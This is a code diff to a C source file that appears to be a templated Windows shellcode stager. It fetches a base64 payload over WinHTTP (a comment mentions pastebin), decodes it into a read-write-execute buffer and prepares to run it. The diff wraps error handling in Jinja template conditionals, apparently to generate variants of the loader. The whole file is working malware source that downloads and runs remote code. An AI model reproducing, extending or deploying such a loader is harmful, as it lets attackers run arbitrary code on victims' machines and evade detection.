@@ -20,16 +20,14 @@
 #include <winhttp.h>
 #include <wincrypt.h>
 
-//#include "block_api.s"
-
-//extern void api_call();
-
+{% if errorHandling %}
 /* a quick routine to quit and report why we quit */
 void punt(char * error) {
   printf("Bad things: %s\n", error);
   printf("Official error: %lu\n", GetLastError());
   exit(1);
 }
+{% endif %}
 
 int main(int argc, char * argv[]) {
   BYTE * buffer;
@@ -76,6 +74,12 @@ int main(int argc, char * argv[]) {
     punt("could not open HTTP session\n");
   }*/
 
+  {% if errorHandling %}
+  if(hSession == NULL) {
+    punt("could not open HTTP session\n");
+  }
+  {% endif %}
+
   /*if (argc != 3) {
     printf("%s [host] [port]\n", argv[0]);
     exit(1);
@@ -101,10 +105,12 @@ int main(int argc, char * argv[]) {
   : "eax", "ebx"
   );
 
-  /*if(hConnect == NULL) {
+  {% if errorHandling %}
+  if(hConnect == NULL) {
     punt("could not open HTTP connection\n");
     if (hSession) WinHttpCloseHandle(hSession);
-  }*/
+  }
+  {% endif %}
 
   /* send HTTP GET to target host */
 
@@ -128,6 +134,16 @@ int main(int argc, char * argv[]) {
   : "eax", "ebx"
   );
 
+  {% if errorHandling %}
+  if(hRequest == NULL) {
+    punt("could not open HTTP request\n");
+    if (hConnect) WinHttpCloseHandle(hConnect);
+    if (hSession) WinHttpCloseHandle(hSession);
+  }
+  {% endif %}
+
+  /* send HTTP GET to target host */
+
   // if (hConnect)
   /*hRequest = WinHttpOpenRequest(hConnect,
                                 L"GET",
@@ -137,13 +153,7 @@ int main(int argc, char * argv[]) {
                                 WINHTTP_DEFAULT_ACCEPT_TYPES,
                                 0);*/
 
-  /*if(hRequest == NULL) {
-    punt("could not open HTTP request\n");
-    if (hConnect) WinHttpCloseHandle(hConnect);
-    if (hSession) WinHttpCloseHandle(hSession);
-  }*/
-
-  /*BOOL success = WinHttpSendRequest(hRequest, 
+  /*{% if errorHandling %}BOOL success = {% endif %}WinHttpSendRequest(hRequest, 
                                     WINHTTP_NO_ADDITIONAL_HEADERS,
                                     0,
                                     WINHTTP_NO_REQUEST_DATA,
@@ -166,15 +176,7 @@ int main(int argc, char * argv[]) {
   : "eax", "ebx"
   );
 
-  /*if(!success) {
-    punt("could not send HTTP request\n");
-    if (hRequest) WinHttpCloseHandle(hRequest);
-    if (hConnect) WinHttpCloseHandle(hConnect);
-    if (hSession) WinHttpCloseHandle(hSession);
-  }*/
-
   /* receive response from server */
-
   /*if (!WinHttpReceiveResponse(hRequest, NULL)) {
     punt("no response received\n");
     if (hRequest) WinHttpCloseHandle(hRequest);
@@ -219,24 +221,29 @@ int main(int argc, char * argv[]) {
   if (hConnect) WinHttpCloseHandle(hConnect);
   if (hSession) WinHttpCloseHandle(hSession);
 
-  BOOL win = CryptStringToBinary(pszOutBuffer, dwSize, CRYPT_STRING_BASE64,
+  {% if errorHandling %}BOOL win = {% endif %}CryptStringToBinary(pszOutBuffer, dwSize, CRYPT_STRING_BASE64,
                                  NULL, &size, NULL, NULL);
 
   /* allocate a RWX buffer */
   buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+  {% if errorHandling %}
   if (buffer == NULL) {
     punt("could not allocate buffer\n");
   }
+  {% endif %}
 
   /* read <size> characters, b64 decode, then treat as code, and
    * toss our newly found shellcode into the buffer */
 
-  win = CryptStringToBinary(pszOutBuffer, 0, CRYPT_STRING_BASE64,
+  {% if errorHandling %}win = {% endif %}CryptStringToBinary(pszOutBuffer, 0, CRYPT_STRING_BASE64,
                                  buffer, &size, NULL, NULL);
 
+  {% if errorHandling %}
   if(!win) {
     printf("Could not decode pastebin b64 string.\n");
   }
+  {% endif %}
 
   free(pszOutBuffer);
 
